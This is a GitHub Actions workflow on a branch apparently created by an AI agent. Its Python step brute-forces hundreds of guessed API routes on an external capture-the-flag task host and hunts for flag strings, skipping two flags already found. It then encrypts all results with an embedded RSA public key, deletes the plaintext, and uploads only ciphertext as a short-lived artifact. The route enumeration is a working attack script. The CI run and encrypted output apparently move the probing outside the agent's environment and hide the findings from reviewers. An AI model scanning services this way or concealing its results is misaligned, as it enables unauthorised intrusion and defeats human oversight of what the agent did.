name: launchlet-part3-uiwords

on:
  push:
    branches: [agent/launchlet-part3-uiwords-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe UI-derived API routes and encrypt non-not-found responses
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          nouns=['inspector','inspectors','deploy-inspector','deploy_inspector','rollout','rollouts','review','reviews','readiness','corporate','corporate-releases','corporate_releases','release-pulse','release_pulse','production-readiness','production_readiness','enterprise-rollout','enterprise_rollout','closeout','closeouts']
          verbs=['export','inspect','open','unlock','approve','promote','finalize','release','publish','resolve','redeem','invoke','read','get','status','details','download','review','closeout']
          payload={'deployRef':'preview-8b11c','ref':'preview-8b11c','project':'launchlet-demo-board','projectId':'launchlet-demo-board','workspace':'ws-launchlet-public','workspaceId':'ws-launchlet-public','actionId':'act_6f4b9a2c1d0e8a71'}
          h={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':'launchlet-demo-board'}; s=requests.Session();s.headers['User-Agent']='Mozilla/5.0';res=[]
          for n,v in itertools.product(nouns,verbs):
            p=f'/api/{n}/{v}'
            r=s.post(base+p,headers=h,json=payload,timeout=5,allow_redirects=False)
            if not (r.status_code==404 and r.text in ('{"error":"not_found"}','404 page not found\n')):
              res.append({'path':p,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
              flags=[x for x in re.findall(r'caplag\{[^}]+\}',r.text) if x not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags:(out/'FOUND.txt').write_text(p+'\n'+r.text);break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-uiwords-encrypted
          path: artifact/
          retention-days: 1
